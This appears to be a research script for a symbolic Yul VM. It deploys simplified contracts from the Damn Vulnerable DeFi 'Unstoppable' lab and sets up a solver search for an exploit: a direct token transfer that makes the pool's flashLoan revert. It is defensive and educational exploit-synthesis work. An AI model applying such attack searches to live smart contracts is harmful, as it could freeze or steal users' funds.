#lang rosette
(require json)
(require "./eurus/zhash.rkt")
(require "./eurus/yul-manager.rkt" "./eurus/yul-config.rkt" "./eurus/yul-utils.rkt" "./eurus/yul-vm.rkt"
         "./eurus/yul-parser.rkt" "./eurus/yul-grammar.rkt" "./eurus/yul-components.rkt")

; ===============
; initializations
; ===============

; eurus contract path
(define config-path "./examples/vm-shared-config.json")
(define lender-path "./examples/unstoppable-simplified/unstoppableLender.eurus.json")
(define receiver-path "./examples/unstoppable-simplified/ReceiverUnstoppable.eurus.json")
(define token-path "./examples/unstoppable-simplified/ERC20.eurus.json")

; addresses of different roles
(define admin-account-addr 5) ; used for setting up the benchmark
(define token-contract-addr 17)
(define lender-contract-addr 37)
(define receiver-contract-addr 101)

; yul vm manager
(define mgr (new yul-manager%))

; token initialization
(printf "# initializing token...\n")
(send mgr deploy token-path config-path token-contract-addr)
(define token-vm (send mgr get-vm token-contract-addr)) ; get vm
(define cp-token-constructor (let (
  [gas 0] [wei 0] [cd (construct-calldata "constructor()" (list ))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(send token-vm construct cp-token-constructor) ; call constructor

; lender initialization
(printf "# initializing lender...\n")
(send mgr deploy lender-path config-path lender-contract-addr)
(define lender-vm (send mgr get-vm lender-contract-addr)) ; get vm
(define cp-lender-constructor (let (
  [gas 0] [wei 0] [cd (construct-calldata "constructor(address)" (list (cons "address" token-contract-addr)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(send lender-vm construct cp-lender-constructor) ; call constructor

; receiver initialization
(printf "# initializing receiver...\n")
(send mgr deploy receiver-path config-path receiver-contract-addr)
(define receiver-vm (send mgr get-vm receiver-contract-addr)) ; get vm
(define cp-receiver-constructor (let (
  [gas 0] [wei 0] [cd (construct-calldata "constructor(address)" (list (cons "address" lender-contract-addr)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(send receiver-vm construct cp-receiver-constructor) ; call constructor

; ========================
; benchmark context set-up
; ========================
; see https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/unstoppable/unstoppable.challenge.js

; get 1000000 tokens in pool to admin
(printf "# [admin] get 1000000 tokens in pool to admin\n")
(define cp0 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "eurus_set_balances(address,uint256)" (list (cons "address" admin-account-addr) (cons "uint256" 1000000)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(define ret0 (send token-vm dispatch cp0)) ; call method and get result

; verify current tokens in pool for admin
(printf "# [admin] verify current tokens in pool for admin\n")
(define cp1 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "balanceOf(address)" (list (cons "address" admin-account-addr)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(define ret1 (send token-vm dispatch cp1)) ; call method and get result
(define res1 (apply concat (car (ret-values ret1)))) ; assemble readable result
(printf "   # [admin] ~a\n" res1)

; transfer all 1000000 from admin to lender
(printf "# [admin] transfer all 1000000 from admin to lender\n")
(define cp2 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "depositTokens(uint256)" (list (cons "uint256" 1000000)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(define ret2 (send lender-vm dispatch cp2)) ; call method and get result

; get 100 tokens in pool to receiver
(printf "# [admin] get 100 tokens in pool to receiver\n")
(define cp3 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "eurus_set_balances(address,uint256)" (list (cons "address" receiver-contract-addr) (cons "uint256" 100)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(define ret3 (send token-vm dispatch cp3)) ; call method and get result

; verify current tokens in pool for lender
(printf "# [admin] verify current tokens in pool for lender\n")
(define cp4 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "balanceOf(address)" (list (cons "address" receiver-contract-addr)))])
  (callpack admin-account-addr gas wei cd))) ; construct callpack
(define ret4 (send token-vm dispatch cp4)) ; call method and get result
(define res4 (apply concat (car (ret-values ret4)))) ; assemble readable result
(printf "   # [admin] ~a\n" res4)

; ======================
; perform synthesis here
; ======================
; set up symbolic variables and problem
(printf "# [admin] set up symbolic variables and problem\n")
(define yul-builtin-function-book (get-field yul-builtin-function-book token-vm)) ; get the function book first
(send lender-vm update-yul-builtin-function-book "revert" (lambda (cp x y) (assert #f) (ret 'revert (list )))) ; hijack to assert #f
(send token-vm update-yul-builtin-function-book "revert" (lambda (cp x y) (assert #f) (ret 'revert (list )))) ; hijack to assert #f

(define-symbolic x0 integer?)
; (define x0 1)
(assert (> x0 0))
(define cp-x0-b0 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "transfer(address,uint256)" (list (cons "address" lender-contract-addr) (cons "uint256" x0)))])
  (callpack receiver-contract-addr gas wei cd))) ; construct callpack
(define cp-x0-b1 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "balanceOf(address)" (list (cons "address" lender-contract-addr) ))])
  (callpack receiver-contract-addr gas wei cd))) ; construct callpack

(define attack-candidate-components (list
  (lambda () (send token-vm dispatch cp-x0-b0))
  (lambda () (send token-vm dispatch cp-x0-b1))
))
(define-symbolic attack-ptr0 integer?)
(define attack-step0 (list-ref attack-candidate-components attack-ptr0))

(printf "# [receiver/attacker] execute symbolic attacks\n")
(define attack-return-step0 (attack-step0)) ; execute

; set up constraint callback: override `revert` to set constraint solving flags
(printf "# [admin] set up constraint callback\n")
(define exploited #f)
(send lender-vm update-yul-builtin-function-book "revert" (lambda (cp x y) (set! exploited #t) (ret 'revert (list )))) ; hijack to set exploit flag

; ===========================================================
; verification procedure after candidate exploit is performed
; ===========================================================
; call flashLoan, and if the exploit is successful, this would throw an exception
(printf "# [receiver] attack result verification: call flashLoan\n")
(define cp100 (let (
  [gas 0] [wei 0]
  [cd (construct-calldata "flashLoan(uint256)" (list (cons "uint256" 99)))])
  (callpack receiver-contract-addr gas wei cd))) ; construct callpack
(define ret100 (send lender-vm dispatch cp100)) ; call method and get result

(current-bitwidth 64)
; (solve (assert exploited))